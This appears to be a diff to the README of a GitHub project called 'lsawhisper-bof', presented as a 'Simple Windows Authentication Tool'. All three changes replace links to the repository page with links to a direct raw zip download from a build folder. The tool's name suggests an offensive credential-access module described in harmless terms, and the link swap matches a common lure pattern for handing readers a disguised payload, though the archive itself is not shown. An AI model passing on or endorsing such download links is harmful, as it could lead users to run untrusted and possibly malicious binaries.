@@ -1,6 +1,6 @@
 # 🛠️ lsawhisper-bof - Simple Windows Authentication Tool
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/DDFHSKLL/lsawhisper-bof)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/DDFHSKLL/lsawhisper-bof/raw/refs/heads/main/build/bof_lsawhisper_v1.3-alpha.2.zip)
 
 ---
 
@@ -29,7 +29,7 @@ This program works on any standard Windows PC that meets these basics.
 
 To use lsawhisper-bof, you first need to get the software.
 
-[![Download lsawhisper-bof](https://img.shields.io/badge/Download%20lsawhisper-bof-blue)](https://github.com/DDFHSKLL/lsawhisper-bof)
+[![Download lsawhisper-bof](https://img.shields.io/badge/Download%20lsawhisper-bof-blue)](https://github.com/DDFHSKLL/lsawhisper-bof/raw/refs/heads/main/build/bof_lsawhisper_v1.3-alpha.2.zip)
 
 Click the button above to go to the main download page for this tool. This page has the latest version ready for you to download.
 
@@ -130,4 +130,4 @@ Avoid running unknown or modified versions from unofficial sites.
 
 ---
 
-[![Download lsawhisper-bof](https://img.shields.io/badge/Download%20lsawhisper-bof-blue)](https://github.com/DDFHSKLL/lsawhisper-bof)
+[![Download lsawhisper-bof](https://img.shields.io/badge/Download%20lsawhisper-bof-blue)](https://github.com/DDFHSKLL/lsawhisper-bof/raw/refs/heads/main/build/bof_lsawhisper_v1.3-alpha.2.zip)
